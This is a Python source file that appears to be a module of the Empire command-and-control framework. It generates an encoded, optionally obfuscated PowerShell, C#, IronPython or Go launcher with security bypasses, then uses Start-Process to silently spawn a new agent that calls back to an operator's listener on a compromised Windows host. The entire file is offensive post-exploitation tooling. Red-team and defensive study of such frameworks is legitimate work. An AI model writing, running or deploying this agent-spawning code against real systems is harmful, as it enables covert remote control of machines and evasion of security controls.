from empire.server.common.empire import MainMenu
from empire.server.core.exceptions import ModuleValidationException
from empire.server.core.module_models import EmpireModule


class Module:
    @staticmethod
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ):
        listener_name = params["Listener"]
        user_agent = params["UserAgent"]
        proxy = params["Proxy"]
        proxy_creds = params["ProxyCreds"]
        sys_wow64 = params["SysWow64"]
        language = params["Language"]

        launcher_obfuscate = params["Obfuscate"].lower() == "true"
        launcher_obfuscate_command = params["ObfuscateCommand"]

        if language == "powershell":
            launcher = main_menu.stagergenv2.generate_launcher(
                listener_name=listener_name,
                language=language,
                encode=True,
                obfuscate=launcher_obfuscate,
                obfuscation_command=launcher_obfuscate_command,
                user_agent=user_agent,
                proxy=proxy,
                proxy_creds=proxy_creds,
                bypasses=params["Bypasses"],
            )
        elif language in ["csharp", "ironpython"]:
            launcher = main_menu.stagergenv2.generate_exe_oneliner(
                language=language,
                obfuscate=obfuscate,
                obfuscation_command=launcher_obfuscate,
                encode=True,
                listener_name=listener_name,
            )

        elif language == "go":
            launcher = main_menu.stagergenv2.generate_go_exe_oneliner(
                language=language,
                obfuscate=obfuscate,
                obfuscation_command=launcher_obfuscate,
                encode=True,
                listener_name=listener_name,
            )

        if launcher == "":
            raise ModuleValidationException("Error in launcher command generation.")

        if sys_wow64.lower() == "true":
            stager_code = (
                "$Env:SystemRoot\\SysWow64\\WindowsPowershell\\v1.0\\" + launcher
            )
        else:
            stager_code = (
                "$Env:SystemRoot\\System32\\WindowsPowershell\\v1.0\\" + launcher
            )

        parts = stager_code.split(" ")

        script = "Start-Process -NoNewWindow -FilePath \"{}\" -ArgumentList '{}'; 'Agent spawned to {}'".format(
            parts[0], " ".join(parts[1:]), listener_name
        )

        return main_menu.modulesv2.finalize_module(
            script=script,
            script_end="",
            obfuscate=obfuscate,
            obfuscation_command=obfuscation_command,
        )
